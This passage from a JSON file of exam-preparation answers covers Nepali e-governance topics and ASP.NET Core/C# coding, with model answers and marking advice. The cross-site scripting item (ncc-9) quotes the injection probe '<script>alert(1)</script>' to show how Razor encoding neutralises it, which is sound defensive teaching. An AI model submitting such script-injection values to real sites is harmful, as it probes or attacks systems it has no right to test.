and digital signature.\n6. Transformation — integrated single window, participation, redesigned processes.\nDraw the six stages as a ladder and mark Nepal between three and four."},"egov-74":{"u":2,"logic":"The phrase with example is the trap: five definitions alone is a five-mark answer, so the same service must be carried up all five levels.","how":"Take property tax and show it at every level — page, form, query, payment, integration. One example carried through earns full marks.","skel":["Five levels named with characteristics","Carry one service: municipal property tax","Level 1 page, level 2 form download","Level 3 submit and query, level 4 pay online","Level 5 land registry integration, reminders"],"ans":"The maturity model describes how far a government has moved from publishing information to integrating whole processes, in five levels.\nRunning example — property tax in a municipality:\n1. Emerging: rates and the office address sit on a static web page.\n2. Enhanced: the assessment form and citizen charter can be searched and downloaded.\n3. Interactive: the citizen submits the form online and queries the demand by SMS.\n4. Transactional: tax is calculated, paid through a payment gateway and a signed receipt is issued instantly.\n5. Connected: the system pulls the property record from the land registry, updates accounts, issues a no-dues certificate and reminds the citizen before the due date.\nIntegration, personalisation, security, back-office reform and participation rise across levels. Nepal: most offices sit at level two or three, with level four in IRD e-filing, e-passport and some municipal tax systems. Draw the staircase with the tax example written at each step."},"egov-75":{"u":5,"logic":"Two halves in one question: architecture recall plus a Nepal-specific application. The second half is where most candidates go generic.","how":"Draw the ETL pipeline with components labelled, then six Nepal bullets — census, prices, tax, land, health, subsidy.","skel":["Define warehouse with four characteristics","Draw source, ETL, staging, warehouse, marts","Metadata, access tools, governance","Nepal: census, commodity prices, IRD tax","Nepal: land, health, subsidy lists"],"ans":"A data warehouse is a subject-oriented, integrated, time-variant and non-volatile store built for decision support.\nComponents:\n• Source systems: operational databases, registers, surveys, spreadsheets and external data.\n• ETL: extract, clean, transform and load; where inconsistent formats are reconciled.\n• Staging area and warehouse database: the integrated historical core.\n• Metadata repository: definitions, lineage and business rules, without which nobody trusts the numbers.\n• Data marts: department slices — health, education, revenue.\n• Access tools: OLAP, query and reporting, dashboards, mining engines.\n• Governance and security: ownership, quality rules, access control, retention.\nApplications of mining in Nepal:\n• Census data for planning, delimitation and resource allocation.\n• Prices of essential commodities for inflation monitoring and supply decisions.\n• IRD tax data for compliance risk and fraud detection.\n• Land records for mutation anomalies and disputes.\n• Health and education dashboards for coverage and dropout.\n• Social-security lists for de-duplication and leakage control."},"egov-76":{"u":2,"logic":"A single-model question, so it rewards precision: who receives the information and what they can do with it, plus one honest limitation.","how":"Define, then flow, then examples, then strength and weakness. End with one line contrasting it against broadcasting.","skel":["Definition: sensitive information to those who act","Flow: to media, auditors, courts, watchdogs","Examples: assets, tenders, audit, pollution","Strength: accountability at low cost","Weakness: needs law and media capacity"],"ans":"The critical flow model channels sensitive, high-value information to the people who can act on it, so disclosure produces accountability rather than mere publicity.\n• Flow: from government or an insider to journalists, auditors, courts and watchdogs — selective, not one-to-many.\n• Content: asset declarations of ministers and MPs, tender and contract documents, audit reports, pollution and inspection data, RTI replies, beneficiary lists.\n• Purpose: expose wrongdoing, enable sanction, and shift information in favour of the weaker party.\n• Example: publishing road contracts beside their completion status lets media and voters question a minister.\n• Strength: high accountability per rupee, and it can protect whistle-blowers.\n• Weakness: needs legal protection, media capacity and authentic data, else it becomes allegation without proof.\nUnlike broadcasting, which widens reach, critical flow targets consequence."},"egov-77":{"u":3,"logic":"The example clause is the differentiator; candidates list components but cannot show readiness as a bundle rather than hardware.","how":"Seven components as bullets, then one municipality example showing high hardware and low readiness.","skel":["Define framework as a readiness checklist","Infrastructure, affordability, human capacity","Content, legal framework, government adoption","Business environment and payment systems","Example: fibre but no skills or content"],"ans":"The e-readiness framework is a checklist for judging a country's preparedness to use ICT for service delivery.\n• Infrastructure: connectivity, bandwidth, electricity, devices, data centres.\n• Affordability: cost of access and devices relative to income.\n• Human capacity: citizen digital literacy and official ICT skills.\n• Content: usable local-language content and real online services.\n• Legal framework: e-transactions, digital signature, privacy, cybercrime.\n• Government adoption: an e-government authority, budget and standards.\n• Business environment: private participation and payment systems.\nExample: a rural municipality with fibre and computers but no trained staff, no digitised records and no Nepali content scores low — readiness is a bundle, not a purchase. National scoring uses the UN EGDI and the Networked Readiness Index; Nepal's constraints are skills, content and law more than connectivity."},"egov-78":{"u":1,"logic":"Wants a two-sided argument; answers that only claim e-governance bridges the divide miss the exclusion it can create.","how":"Two headed lists — widening and narrowing — then a policy line. Balance is the mark scheme.","skel":["E-governance cuts both ways","Widens: literacy, urban bias, cost, online-only","New middlemen where access is paid","Narrows: telecentres, mobile, local language","Policy: keep an offline channel, measure usage"],"ans":"E-governance can widen or narrow the digital divide, by design.\nWidening impact:\n• Only the connected, literate and English-capable benefit, so elites capture services first.\n• Urban bias in connectivity and office computerisation.\n• Data and device cost excludes low-income households.\n• Online-only mandates push the excluded to paid intermediaries — new middlemen.\n• Skills gap in government: untrained staff give wrong information.\nNarrowing impact:\n• Telecentres and service centres (Nenasala, Ekal Seva Kendra) put a trained operator within walking distance.\n• Mobile-first services and SMS or IVR reach feature-phone users.\n• Local-language interfaces and assisted counters reduce the literacy barrier.\n• Direct benefit transfer and online land records cut the middleman's rent.\nPolicy: keep an offline channel, fund access points, measure usage by district and group, not portal count."},"egov-79":{"u":6,"logic":"Tests currency rather than history; answers stuck at e-passport and websites miss identity, interoperability and cloud consolidation.","how":"Eight short trend bullets, each naming a live system, then one closing line on what still lags.","skel":["Mobile-first, identity-centric, integration-driven","National ID as common identifier","Nagarik App, connectIPS payments","APIs, single sign-on, NGIDC consolidation","Cloud, local-level systems, open data, AI"],"ans":"Nepal's current e-governance direction is mobile-first, identity-centric and integration-driven.\n• Single identity: the national ID as the common identifier across services.\n• Mobile front end: Nagarik App aggregating documents, with connectIPS payment.\n• Interoperability: APIs and single sign-on replacing silos; NGIDC consolidating hosting.\n• Cloud and shared services: government cloud, common payment gateway, SMS gateway and GIS platform.\n• Local-level systems: municipal tax, billing and registration software spreading after federalisation.\n• Openness: budget, tender and beneficiary publication, and RTI portals.\n• Dashboards and analytics over revenue, health and education data.\n• Security: Cyber Security Policy 2077, CERT response, and a pending data-protection bill.\n• New technology: chatbots and AI assistants answering information requests.\nThe trend is from websites to integrated services; rural connectivity and legal readiness still lag."},"egov-80":{"u":2,"logic":"Single-model question; the exam wants the mechanism in steps and an honest limitation, not a paragraph praising comparison.","how":"Four numbered steps, one Nepali or Indian example, then strength and limit in a line each.","skel":["Definition: comparison creates pressure","Choose indicator, collect uniformly","Publish ranking or report card","Media and citizens react, reward improvement","Limit: credible like-for-like data"],"ans":"The comparative analysis model uses published comparisons of government performance to create pressure for improvement.\nHow it works:\n1. Choose a comparable indicator — pass rate, service time, budget utilisation, complaint resolution.\n2. Collect the same data from all units — districts, wards, hospitals — using one definition.\n3. Publish rankings, tables or report cards in the press and online.\n4. Let media, citizens and supervising agencies react, and reward improvement.\nExample: publishing SEE pass rates by school, or municipal budget against spending by ward, makes a poor performer visible without a complaint. Citizen report cards work the same way.\nStrength: cheap, evidence-based, uses rivalry not coercion. Limit: needs credible like-for-like data — badly normalised comparisons punish poor districts for being poor, and publication with no follow-up becomes ritual."},"egov-81":{"u":3,"logic":"Tests sequencing, not shopping: the examiner wants pre-conditions such as power, standards and O&M money, not just computers.","how":"Eight pre-requisite bullets, then one line on sequence — connectivity, data centre, skills before portals.","skel":["Connectivity: backbone and last mile","Power, devices, hosting capacity","Standards, interoperability, procurement rules","Institutions, skilled staff, O&M budget","Legal, security, local-language content"],"ans":"Infrastructure development needs readiness in several areas before hardware is bought.\n• Connectivity: national fibre backbone, provincial links, last-mile broadband, wireless for remote districts.\n• Power: reliable electricity and backup at every office.\n• Devices and hosting: computers at counters, a tiered data centre and cloud capacity.\n• Standards: data definitions, interoperability and procurement standards, so systems interoperate.\n• Institutions: an e-government authority, a CIO in each ministry and clear coordination rules.\n• People: trained administrators and technicians, with retention plans.\n• Money: capital plus a recurring operations and maintenance budget; most projects die at O&M.\n• Legal and security: e-transaction law, digital signature, privacy and CERT capability.\n• Content: local-language services citizens need.\nSequence matters: connectivity, data centre and skills before portals. Nepal's gap is O&M and skills, not servers."},"egov-82":{"u":6,"logic":"Wants rural development through concrete channels; generic inclusion talk without kiosks, prices or telemedicine scores low.","how":"Nine bullets grouped as access, agriculture, land, health, education, money, local government, then one sequencing line.","skel":["Access points and digital literacy first","Agriculture: prices, weather, pest alerts","Land records from a kiosk","Telemedicine, e-learning, teacher attendance","Direct benefit transfer, local accounting"],"ans":"E-governance develops rural areas by cutting distance between village and state and making rural data visible.\n• Access points: telecentres or service centres with a trained operator, so no smartphone is needed.\n• Digital literacy: short courses for farmers, women's groups and local officials.\n• Agriculture: market prices, weather, pest alerts and extension advice by SMS, backed by crop data mining.\n• Land records online: printed records from a kiosk end the talathi visit.\n• Health: telemedicine to district hospitals, drug stock and immunisation tracking.\n• Education: enrolment and scholarship data, e-learning content, teacher attendance.\n• Money: direct benefit transfer to bank accounts, with beneficiary lists mined for leakage.\n• Local government: e-Panchayat or municipal accounting, plan monitoring and grievance tracking.\nNepal's rural municipalities need the kiosk model before the app model."},"egov-83":{"u":3,"logic":"Tests planning as a sequence of decisions including re-engineering and O&M; students usually write a list of technologies instead.","how":"Nine numbered steps from vision to evaluation, and make re-engineering-before-automation the highlighted step.","skel":["Vision, leadership, named authority","Baseline e-readiness and service inventory","Prioritise high-volume services","Re-engineer process before automating it","Architecture, roadmap, funding, capacity, M&E"],"ans":"Strategic planning decides which services, in what order, with which money and standards, so e-government becomes a programme, not a series of purchases.\n1. Vision and leadership: a published policy, a named authority and ministerial ownership.\n2. Baseline: e-readiness assessment and service inventory.\n3. Prioritisation: high-volume, high-pain, high-visibility services first — certificates, tax, land, pensions.\n4. Re-engineering before automation: simplify the process, or you computerise delay.\n5. Architecture and standards: data, interoperability, security and procurement standards.\n6. Roadmap and funding: pilots then scale, capital plus O&M budget.\n7. Capacity: training, incentives, help desk, citizen communication.\n8. Legal framework: electronic transactions, digital signature, privacy.\n9. Monitoring and evaluation: usage, cost, time saved and satisfaction, feeding the next cycle.\nDigital Nepal Framework 2076 is such a plan; its test is prioritisation and O&M funding."},"egov-84":{"u":6,"logic":"Asks for contents, so module names are the marks; answers describing only payroll miss establishment, appraisal and audit.","how":"List ten modules in administrative order, from employee record to reports, then add roles and audit logging.","skel":["Employee master and service book","Recruitment, establishment, posting","Attendance, leave, payroll, pension","Appraisal, promotion, training, discipline","Reports, self-service, roles and audit logs"],"ans":"Human resource management software for government is a set of integrated modules around one employee record.\n• Employee master data: personal details, post, grade, qualification, service book and photograph.\n• Recruitment: vacancy, applicant tracking, exam results, appointment order.\n• Establishment and posting: sanctioned versus filled posts, deputation and transfer history.\n• Attendance and leave: biometric or mobile attendance, leave types, balance and approval workflow.\n• Payroll: basic pay, allowances, deductions, tax, loans, provident fund, bank transfer.\n• Pension and gratuity: retirement calculation, family pension and verification.\n• Performance and promotion: targets, appraisal ratings, eligibility and seniority lists.\n• Training, discipline and grievance: needs, nominations, case files and appeals.\n• Reports and self-service: payslips, vacancy dashboards, statutory returns, APIs to treasury.\nAlso roles, audit logs and a retention policy, because personnel data is sensitive."},"egov-85":{"u":6,"logic":"Pairs a repeat case study with a payments concept; the examiner checks whether you know the payment chain, not just wallets.","how":"Three lines on judiciary since it repeats, then the bulk on e-payment: components, uses, benefits, risks. It is a sure shot.","skel":["Judiciary: status, cause list, e-filing, VC","E-payment definition and channels","Components: gateway, bank, receipt, reconciliation","Uses: tax, bills, fees, fines, subsidies","Benefits and risks, keep a counter open"],"ans":"IT in judiciary (brief): e-courts computerise case registration, cause lists, status, e-filing, judgements, certified copies and video conferencing. It cuts adjournments, lost files and travel; Nepal's Supreme Court system and virtual hearings are examples.\nE-payment: electronic transfer of money between citizen and government through a gateway, internet banking, cards, wallets or connectIPS. Components: gateway, bank or wallet integration, digital receipt, treasury reconciliation, audit trail.\n• Uses: tax and revenue, utility bills, licence and registration fees, fines, exam fees, subsidies and refunds.\n• Benefits: instant confirmation, no cash or queue, automatic reconciliation, less leakage, records for both sides.\n• Risks: fraud and chargeback, failed transactions without refund, dependence on connectivity, and exclusion of the unbanked, so a counter must remain.\nNepal's IRD e-filing with connectIPS payment is the working local example."},"ncc-1":{"u":1,"logic":"Tests whether you know a lambda is a delegate literal, not a LINQ feature, and whether you can write async I/O rather than only define it. The program separates memorisers from readers.","how":"Three blocks: definition plus two-line comparison, then one short ReadToEndAsync program, then five benefit bullets. Spend the marks on the program, not the prose.","skel":["Define lambda as anonymous function for delegates","Expression lambda returns; statement lambda uses braces","Write async method with ReadToEndAsync","Five benefits of async/await","Close on thread release during I/O"],"ans":"• Lambda expression — an anonymous function written as (parameters) => body, used to create a delegate or LINQ predicate without a named method.\n• Expression lambda — body is one expression whose value is returned: x => x * 2, or nums.Where(n => n % 2 == 0).\n• Statement lambda — body is a block with braces, several statements and an explicit return: (a, b) => { var s = a + b; return s; }.\nAsynchronous file read:\nusing System.IO;\nasync Task<string> ReadAsync() {\n  using var sr = new StreamReader(\"data.txt\");\n  return await sr.ReadToEndAsync();\n}\n// string text = await ReadAsync();\nThe compiler turns each await into a state machine: the thread returns to the pool until the read completes, then execution resumes.\nBenefits of async/await:\n1. Frees the request thread, so the server handles more users.\n2. Keeps the UI responsive during slow work.\n3. Simpler and safer than callbacks or Begin/End pairs.\n4. Scales I/O-bound work without extra threads.\n5. Exceptions propagate normally through try/catch, and code reads top to bottom."},"ncc-2":{"u":4,"logic":"Probes whether you know Razor is server-side rendering that produces a string, and whether you can name the pieces that keep markup out of C#. Many students describe only @Model.","how":"Answer in three blocks: what Razor does, the render-to-string steps with a four-line method, then the feature list. Add the request → view → HTML arrow.","skel":["Define Razor as .cshtml template with @C#","Capture: find view, render into StringWriter","Show the render-to-string method","List layouts, partials, tag helpers, view components","Close on separation of concerns"],"ans":"Razor is the server-side templating engine that turns a .cshtml file (HTML plus C# after @) into an HTML string written to the response.\nCapturing Razor output means rendering a view to a string instead of the response:\n• Inject IRazorViewEngine, ITempDataProvider and the current ActionContext.\n• var v = _engine.FindView(ctx, \"Invoice\", false).View;\n• Render it into a StringWriter using a ViewContext.\n• return sw.ToString();\npublic async Task<string> RenderAsync(object model) {\n  using var sw = new StringWriter();\n  await _view.RenderAsync(new ViewContext(_ctx, _view, _vd, _td, sw, model, new ExpandoObject()));\n  return sw.ToString();\n}\nThis is how e-mail bodies and PDFs are produced from the same view.\nFeatures that generate HTML dynamically:\n• Strongly typed views: @model Student, @Model.Name, @foreach, @if.\n• Layouts (_Layout.cshtml, @RenderBody, @RenderSection) give every page one shell.\n• Partial views, <partial name=\"_Card\" /> and View Components reuse blocks.\n• Tag Helpers (asp-for, asp-action) emit correct HTML, names and URLs.\nSeparation of concerns: the controller supplies data, the view renders markup, so a designer edits .cshtml without touching C#."},"ncc-3":{"u":5,"logic":"Checks that you can justify an ORM and still write raw ADO.NET under exam pressure. The trap is concatenating the price instead of parameterising it.","how":"Split marks evenly: ORM need bullets, ADO.NET component list, then one parameterised SELECT function. Write the @p parameter first, code second.","skel":["Define ORM as object-to-table mapper","Five reasons an ORM is needed","List Connection, Command, Reader, Adapter, DataSet","Write parameterised SELECT with Price > @p","Loop reader into List<Book>"],"ans":"ORM (Object-Relational Mapper) maps C# classes to tables and objects to rows, so the developer writes LINQ instead of SQL.\nWhy we need it:\n• Less boilerplate — no manual connection, command and reader code.\n• Type safety and compile-time checking instead of string SQL.\n• Handles relationships, loading strategies and change tracking.\n• Database independence and Code-First migrations.\n• Parameterises automatically, reducing SQL injection.\nADO.NET components: Connection, Command, DataReader, DataAdapter, DataSet, DataTable and Transaction.\nFunction to fetch books priced above 1000:\npublic List<Book> GetCostly() {\n  var list = new List<Book>();\n  using var con = new SqlConnection(cs);\n  using var cmd = new SqlCommand(\"SELECT ID, Name, Price FROM BOOK WHERE Price > @p\", con);\n  cmd.Parameters.AddWithValue(\"@p\", 1000);\n  con.Open();\n  using var r = cmd.ExecuteReader();\n  while (r.Read())\n    list.Add(new Book { ID = (int)r[\"ID\"], Name = r[\"Name\"].ToString(), Price = (decimal)r[\"Price\"] });\n  return list;\n}\nExecuteReader is connected and forward-only, so the connection stays open inside the using block."},"ncc-4":{"u":1,"logic":"Tests practical JSON handling and whether you notice that JSON keys are case-sensitive. Most marks are lost by writing GetProperty(\"genre\") against a capital G.","how":"One code block with JsonDocument is enough; add the case-sensitivity trap and the Newtonsoft one-liner. Do not write a class unless you have time.","skel":["Parse with JsonDocument.Parse","Read root, then GetProperty for each key","Match the capital G in Genre","Add Newtonsoft JObject alternative","Note case-insensitive option as the fix"],"ans":"JSON is parsed with System.Text.Json (built in) or Newtonsoft.Json.\nusing System.Text.Json;\nstring json = \"{\\\"movie\\\":\\\"The Imitation Game\\\",\\\"Genre\\\":\\\"Science\\\"}\";\nusing var doc = JsonDocument.Parse(json);\nJsonElement root = doc.RootElement;\nstring movie = root.GetProperty(\"movie\").GetString();\nstring genre = root.GetProperty(\"Genre\").GetString();\nConsole.WriteLine($\"{movie} ({genre})\");   // The Imitation Game (Science)\nNewtonsoft equivalent: var o = JObject.Parse(json); string m = (string)o[\"movie\"];\nThe trap: property names are case-sensitive by default, so GetProperty(\"genre\") throws KeyNotFoundException because the JSON says \"Genre\". Fix it with root.TryGetProperty(\"genre\", out var g), or deserialise into a Movie class using JsonSerializer.Deserialize<Movie>(json, new JsonSerializerOptions { PropertyNameCaseInsensitive = true }). Always dispose the JsonDocument."},"ncc-5":{"u":2,"logic":"Asks for the reasoning behind .NET's design, not a feature list. Weak answers describe C# syntax instead of explaining why one runtime and many languages exist.","how":"Frame it as one goal (many languages, one runtime) and then six design decisions that serve it. Each bullet names the component and the reason.","skel":["State the goal: many languages, one runtime","CLI: CTS, CLS, VES as the contract","Compile once to MSIL plus metadata","CLR gives GC, JIT, type safety","BCL, assemblies, side-by-side, NuGet"],"ans":".NET is designed on one idea: many languages, one runtime, so C#, F# and VB code can interoperate inside one process.\n• CLI — an open specification: CTS gives one type system, CLS the common subset every language exposes, VES the execution rules.\n• Compile once to MSIL plus metadata — CPU- and language-independent, so any CLI language can consume any assembly.\n• CLR executes it — JIT compilation to native code, garbage collection, type and memory safety, exception handling, thread management.\n• BCL — one consistent class library, so no language ships half-compatible APIs.\n• Assemblies — self-describing, versioned units; side-by-side versions end DLL hell.\n• Modular NuGet packages, open source and cross-platform (.NET Core), with built-in DI and async-first APIs."},"ncc-6":{"u":3,"logic":"Tests whether you can actually consume an HTTP response in code, not just describe HTTP. Four named methods with one line each is the whole answer.","how":"Name four methods, give one line of code each, then one line on checking the status code. Keep it a list of four — no essay.","skel":["Start from HttpResponseMessage res","ReadAsStringAsync for text","ReadAsStreamAsync plus DeserializeAsync","ReadFromJsonAsync for typed object","ReadAsByteArrayAsync, and check status first"],"ans":"Ways to read the response body from an HttpResponseMessage (System.Net.Http):\n1. String — string body = await res.Content.ReadAsStringAsync(); the simplest option for HTML, XML or JSON you will parse yourself.\n2. Stream — using var s = await res.Content.ReadAsStreamAsync(); then JsonSerializer.DeserializeAsync<Product>(s). Best for large payloads because the body is never fully buffered in memory.\n3. Typed JSON — var p = await res.Content.ReadFromJsonAsync<Product>(); (System.Net.Http.Json) deserialises in a single call with the right content type.\n4. Bytes — byte[] b = await res.Content.ReadAsByteArrayAsync(); used for images, file downloads or hashing.\nAlso: res.Content.Headers.ContentType tells you the format, res.EnsureSuccessStatusCode() throws on 4xx/5xx, and a CancellationToken should be passed so a slow endpoint cannot hang the request thread."},"ncc-7":{"u":6,"logic":"Asks for two client-side state techniques side by side and whether you can retrieve each correctly. Marks come from the retrieval code, not the forms.","how":"Two small forms on P1 with a method marker, one P2 action reading Query and Form, then one line on the security difference. Code first.","skel":["P1: GET form for query string","P1: POST form with hidden field","P2 action reads Request.Query and Request.Form","P2 view prints both values","Compare visibility and security"],"ans":"P1.cshtml — two forms, one per technique:\n<form method=\"get\" asp-action=\"P2\"><input name=\"uname\" /><button>Query string</button></form>\n<form method=\"post\" asp-action=\"P2\"><input id=\"n2\" name=\"uname\" />\n  <input type=\"hidden\" name=\"src\" value=\"hf\" /><button>Hidden field</button></form>\nP2Controller reads both:\npublic IActionResult P2() {\n  ViewBag.QS = Request.Query[\"uname\"];    // ?uname=Ram\n  ViewBag.HF = Request.Form[\"uname\"];     // posted hidden field\n  return View();\n}\nP2.cshtml: <p>Query: @ViewBag.QS</p> <p>Hidden: @ViewBag.HF</p>\nDifference: the query string appears in the URL, is bookmarkable and shareable, but is length-limited and logged; the hidden field travels in the POST body, is invisible on screen yet readable in page source. Neither is secure, so a name is fine here but passwords must go in Session or a server-side store."},"ncc-8":{"u":7,"logic":"Tests whether you can wire real client-side validation: prevent default, test fields, show a message. Naming the plugin alone earns little.","how":"Write one submit handler that sets a flag, then preventDefault once. Add the plugin rules line and the server-side reminder for the last mark.","skel":["Bind submit handler on the form","Trim and test each required field","Set a flag, preventDefault if invalid","Show a message, add error class","Mention validation plugin and server re-check"],"ans":"jQuery validates before the form is posted, giving instant feedback with no round trip.\n<script>\n$(function () {\n  $(\"#reg\").on(\"submit\", function (e) {\n    var ok = true;\n    $(\"#reg input[required]\").each(function () {\n      if ($.trim($(this).val()) === \"\") { $(this).addClass(\"err\"); ok = false; }\n    });\n    if ($(\"#email\").val().indexOf(\"@\") < 0) ok = false;\n    if (!ok) { e.preventDefault(); $(\"#msg\").text(\"Fix the highlighted fields\"); }\n  });\n});\n</script>\n• $(function(){}) waits for the DOM; .on(\"submit\") is the modern binding.\n• $.trim ignores spaces; addClass(\"err\") gives a red border from CSS.\n• Or use the plugin: $(\"#reg\").validate({ rules: { name: \"required\", email: { required: true, email: true } } }); MVC generates these rules from data annotations through unobtrusive validation.\nAlways repeat the checks server-side with ModelState.IsValid, since JavaScript can be disabled."},"ncc-9":{"u":8,"logic":"Probes whether you know Razor encodes by default and that Html.Raw is the usual hole. Answers that say \"validate input\" miss the mechanism the question names.","how":"Explain the mechanism with one before/after example, then list the contexts and the Html.Raw warning. One encoded example earns more than five rules.","skel":["Razor @ HTML-encodes output by default","Show script tag turning into text","Contexts: HTML, attribute, JS, URL","Warn against Html.Raw on user input","Add CSP, HttpOnly, input validation"],"ans":"Output encoding rewrites unsafe characters so injected markup is displayed as text instead of executed.\nRazor encodes every @ expression by default: < becomes &lt;, > becomes &gt;, \" becomes &quot;, ' becomes &#x27;. So a comment of <script>alert(1)</script> rendered with @Model.Comment appears on screen as literal text and never runs.\n• HTML context — @Model.Name is HTML-encoded.\n• Attribute context — @Model.Name inside value=\"…\" is attribute-encoded, so a quote cannot break out.\n• Script context — use @Json.Serialize(model); the serialiser escapes for JavaScript.\n• URL context — use Url.Action, which encodes query values.\nThe encoder is context-aware, so one @ is correct in every position.\n• Never call Html.Raw() on user input, and never concatenate HTML.\n• Validate input server-side, mark auth cookies HttpOnly, and send a CSP header."},"ncc-10":{"u":6,"logic":"A two-topic question that rewards knowing partial classes are a compile-time merge, not inheritance, and that session data lives on the server keyed by a cookie.","how":"Divide the page: partial class with two files merged, then session with the two-line enable/use code. Keep both halves short and separate.","skel":["Partial merges files into one type at compile time","Use for generated code and large classes","Two-line example across two files","Session: server store keyed by SessionId cookie","AddSession, UseSession, SetString/GetString"],"ans":"Partial class — one class declared with the partial keyword in two or more files; the compiler merges them into a single type at build time, so members see each other.\npublic partial class Student { public int Id { get; set; } }\npublic partial class Student { public string Name { get; set; } }   // same class\nUses: keep generated code (designer files, migrations) apart from hand-written code so regeneration never overwrites it, or split a very large class.\nSession state — server-side, per-user storage keyed by a SessionId cookie sent to the browser.\n• Enable: builder.Services.AddSession(); and app.UseSession(); before endpoints.\n• Use: HttpContext.Session.SetString(\"user\", \"ram\"); string u = HttpContext.Session.GetString(\"user\");\n• Lifetime: idle timeout (default 20 minutes) or Clear()/Abandon().\nThe value never leaves the server, so session suits a user id or cart."},"ncc-11":{"u":9,"logic":"Tests the hypervisor-versus-shared-kernel distinction. Answers that only say \"containers are lighter\" without the kernel reason lose half the marks.","how":"Open with the one-line distinction, then compare on five axes in parallel bullets, and finish with when to use each. A small two-box sketch is free marks.","skel":["VM virtualises hardware, container virtualises OS","Guest OS and hypervisor vs shared kernel","Size GB vs MB, boot minutes vs seconds","Density and portability differ","Isolation stronger in VM"],"ans":"A virtual machine virtualises hardware; a container virtualises the operating system.\n• Architecture — a VM runs a full guest OS on a hypervisor (ESXi, Hyper-V). Containers share the host kernel and isolate processes with namespaces and cgroups, run by Docker.\n• Size — VM images are gigabytes (they include an OS); container images are tens of megabytes.\n• Start-up — a VM boots in minutes; a container starts in under a second because it is just a process.\n• Density — a host runs a handful of VMs but hundreds of containers.\n• Portability — the image carries the app and dependencies, so it runs identically everywhere.\n• Isolation — a VM is stronger, having its own kernel.\nUse a VM for another OS or hard multi-tenancy; containers for microservices, CI/CD and scaling. ASP.NET Core ships as a small Linux container image."},"ncc-12":{"u":8,"logic":"Checks the SPA definition and whether you can turn a requirement into an authorization rule with code. The marking is on the role/policy wiring, not the SPA prose.","how":"One tight SPA definition, then three numbered code steps: register Identity, seed the role, protect the actions. Name the attribute in step three.","skel":["SPA: one page, JS views, JSON APIs","Register Identity and a policy requiring Admin","Seed the Admin role at startup","Protect Create, Update, Delete with [Authorize]","Mention JWT claims for API-only SPAs"],"ans":"SPA (Single Page Application) — one HTML page is loaded once; JavaScript renders views and calls Web APIs for JSON, so navigation never reloads the page (Angular, React, Vue). ASP.NET Core serves the shell and the API.\nDefining an Admin role that may create, update and delete any article:\n// 1. Register Identity and a policy\nbuilder.Services.AddIdentity<IdentityUser, IdentityRole>()\n       .AddEntityFrameworkStores<AppDbContext>();\nbuilder.Services.AddAuthorization(o => o.AddPolicy(\"ManageArticles\",\n        p => p.RequireRole(\"Admin\")));\n\n// 2. Seed the role once at startup\nawait roleManager.CreateAsync(new IdentityRole(\"Admin\"));\nawait userManager.AddToRoleAsync(adminUser, \"Admin\");\n\n// 3. Protect the article actions\n[Authorize(Policy = \"ManageArticles\")]\npublic class ArticlesController : Controller {\n  [HttpPost] public IActionResult Create(Article a) { ... }\n  [HttpPut] public IActionResult Update(int id, Article a) { ... }\n  [HttpDelete] public IActionResult Delete(int id) { ... }\n}\nFor a token-based API, put the role in a claim and use RequireRole or [Authorize(Roles = \"Admin\")]; the SPA sends the JWT in the Authorization header."},"ncc-13":{"u":1,"logic":"Tests the three-way distinction students blur: contract versus shared code versus no inheritance. The sealed compile error is the proof the examiner looks for.","how":"Three short definitions with a use case each, then one program covering abstract and sealed. Write the CS0509 error line as a comment — it proves the point.","skel":["Abstract: no instance, shared code, single inheritance","Interface: contract only, many implementations","Sealed: blocks derivation, why you would","Program: abstract Shape with abstract Area","Sealed Square and the CS0509 error line"],"ans":"• Abstract class — cannot be instantiated; may hold fields, constructors, implemented methods and abstract members. Single inheritance only. Use it for an \"is-a\" family that shares code (Shape → Circle, Square).\n• Interface — a pure contract of members with no state (default implementations allowed since C# 8). A class may implement many. Use it for a capability across unrelated types (IDisposable, IComparable).\n• Sealed class — cannot be inherited; the compiler forbids derivation. Use it to protect behaviour from tampering, guarantee immutability (string), avoid virtual dispatch cost, or mark a design as finished.\nProgram:\nabstract class Shape {\n  public abstract double Area();\n  public void Show() => Console.WriteLine($\"Area = {Area():F2}\");\n}\nclass Circle : Shape {\n  public double R; public Circle(double r) => R = r;\n  public override double Area() => Math.PI * R * R;\n}\nsealed class Square : Shape { public override double Area() => 4; }\n// class Big : Square { }   // error CS0509: cannot derive from sealed type\nShape s = new Circle(2); s.Show();   // Area = 12.57, via polymorphism\nThe abstract member forces every subclass to implement Area, while Show stays shared."},"ncc-14":{"u":4,"logic":"Tests the mapping from action results to HTTP status codes, then whether you can build a REST controller. Returning View() in an API or 200 on create are the common errors.","how":"List results in pairs with their status code, then one compact controller with the four verbs. Match POST to 201 and PUT/DELETE to 204.","skel":["Results: View, Json, Content, File, Redirect","Status results: Ok, NotFound, BadRequest, NoContent","ControllerBase with [ApiController] and route","GET, POST returning CreatedAtAction","PUT checks id and returns 204; DELETE 404 or 204"],"ans":"Action results are what an action returns; ASP.NET Core executes them to build the response.\n• View()/ViewResult — renders a .cshtml. PartialView() — fragment only.\n• Json()/JsonResult — serialised JSON. Content() — plain text or HTML string.\n• File() — bytes or stream with a content type. Redirect()/RedirectToAction() — 302.\n• Ok(), NotFound(), BadRequest(), NoContent(), StatusCode() — raw HTTP codes.\n• Challenge() — 401 through the authentication handler. EmptyResult — no body.\nAPI controller for Product(ProductId, Name, Price, Category):\n[ApiController]\n[Route(\"api/[controller]\")]\npublic class ProductsController : ControllerBase {\n  private readonly AppDbContext _db;\n  public ProductsController(AppDbContext db) => _db = db;\n\n  [HttpGet] public async Task<IActionResult> GetAll() =>\n      Ok(await _db.Products.ToListAsync());\n  [HttpGet(\"{id:int}\")] public async Task<IActionResult> Get(int id) {\n    var p = await _db.Products.FindAsync(id);\n    return p == null ? NotFound() : Ok(p);\n  }\n  [HttpPost] public async Task<IActionResult> Post(Product p) {\n    _db.Products.Add(p); await _db.SaveChangesAsync();\n    return CreatedAtAction(nameof(Get), new { id = p.ProductId }, p);   // 201\n  }\n  [HttpPut(\"{id:int}\")] public async Task<IActionResult> Put(int id, Product p) {\n    if (id != p.ProductId) return BadRequest();\n    _db.Entry(p).State = EntityState.Modified;\n    await _db.SaveChangesAsync(); return NoContent();                    // 204\n  }\n  [HttpDelete(\"{id:int}\")] public async Task<IActionResult> Delete(int id) {\n    var p = await _db.Products.FindAsync(id);\n    if (p == null) return NotFound();\n    _db.Products.Remove(p); await _db.SaveChangesAsync(); return NoContent();\n  }\n}\n[ApiController] adds automatic model validation and JSON binding."},"ncc-15":{"u":2,"logic":"A three-part history-and-plumbing question. It rewards knowing that MSIL is CPU-independent and that in-process IIS skips the proxy hop — not memorised marketing terms.","how":"Three headed blocks with a one-line table for the frameworks and a source → IL → 